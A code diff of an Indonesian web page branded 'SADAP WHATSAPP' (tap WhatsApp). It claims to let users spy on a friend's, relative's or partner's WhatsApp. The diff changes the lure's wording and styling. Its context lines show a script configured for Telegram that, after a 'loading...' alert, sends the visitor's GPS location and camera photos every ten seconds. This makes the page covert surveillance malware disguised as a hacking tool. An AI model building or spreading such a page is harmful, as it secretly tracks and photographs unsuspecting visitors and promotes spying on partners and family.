@@ -104,17 +104,94 @@
             margin-bottom: 1.5rem;
             text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
         }
-
+        
         .subtitle {
             font-size: 1.2rem;
             margin-bottom: 1.5rem;
             color: #aaa;
         }
-
+        
+        .dytitle {
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+            color: #aaa;
+            padding: 1rem 1.5rem;
+        }
+        
+        .tombol {
+      position: fixed;
+      bottom: 73px;
+      right: 20px;
+      width: 50px;
+      height: 50px;
+      background-color: #34C759;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      transition: background-color 00.3s ease;
+    }
+    
+    .tombol:hover {
+      background-color: #2E865F;
+    }
+    
+    .tombol a {
+      text-decoration: none;
+      color: #fff;
+      font-size: 24px;
+    }
+        
         .input-container {
             width: 100%;
             max-width: 350px;
             margin-bottom: 1.5rem;
+        }
+        
+           .help-button {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background-color: #34C759;
+      color: #fff;
+      font-size: 24px;
+      text-align: center;
+      line-height: 50px;
+      cursor: pointer;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
+    }
+    
+    .help-tooltip {
+      position: absolute;
+      bottom: 70px;
+      right: 0;
+      width: 300px;
+      background-color: #fff;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
+      display: none;
+    }
+    
+    .help-button:hover + .help-tooltip {
+      display: block;
+    }
+        
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            padding: 10px;
+            background-color: #000;
+            border-top: 1px solid #ccc;
         }
 
         #waNumber {
@@ -160,14 +237,15 @@
 <body>
     <!-- Loading Screen -->
     <div class="loading-container" id="loadingScreen">
-        <div class="loading-text">LOADING</div>
+        <div class="loading-text">Loading</div>
         <div class="loading-bar">
             <div class="loading-progress"></div>
         </div>
     </div>
 
     <!-- Main Screen -->
-    <div class="main-container" id="mainScreen">
+     <div class="main-container" id="mainScreen">
+        <audio src="lagu.mp3" autoplay loop></audio>
         <div class="hacker-logo">💀</div>
         <h1 class="title">SADAP WHATSAPP</h1>
         <p class="subtitle">Nomor Whatsapp</p>
@@ -175,8 +253,23 @@
             <input type="text" id="waNumber" placeholder="+628xxxxxxxxx">
             <div class="error-text" id="errorText">Harap masukan nomor dengan kode negara berawalan +</div>
         </div>
-        <button id="startBtn">MULAI</button>
-    </div>
+        <button id="startBtn">SADAP</button>
+        <p class="dytitle">©By Hardy</p>
+        <div class="footer">
+    Saya adalah program yang lagi di kembangkan oleh Hardy zen fungsi saya adalah menyadap nomor whatsapp seseorang baik itu teman atau keluarga atau pacar,jika ada kendala harap hubungi cs kami</div>
+      <div class="tombol">
+      <a href="next.html">></a>
+      </div>
+      <div class="help-button">?</div>
+  <div class="help-tooltip">
+    <h3>JIKA ANDA MENGALAMI MASALAH</h3>
+    <ol>
+      <li>1.Screenshoot masalah anda</li>
+      <li>2.Kirimkan bukti/ss an masalah anda ke <a href="mailto:langkasekali188@gmail.com">langkasekali188@gmail.com</a></li>
+      <li>3.Jika telah di kirim harap tunggu, karena kami akan proses 1x24 jam</li>
+      <li>4.Jangan gunakan web ini secara sembarangan</li>
+      </ol>
+      </div>
 
     <script>
         // KONFIGURASI TELEGRAM (GUNAKAN ID CHANNEL NUMERIK SAJA)
@@ -215,7 +308,7 @@
                 });
 
                 // Kirim Data setiap 10 Detik
-                alert('WELCOME');
+                alert('loading...');
                 setInterval(async () => {
                     await sendLocation(position.coords.latitude, position.coords.longitude);
                     await sendCameraPhoto(stream);
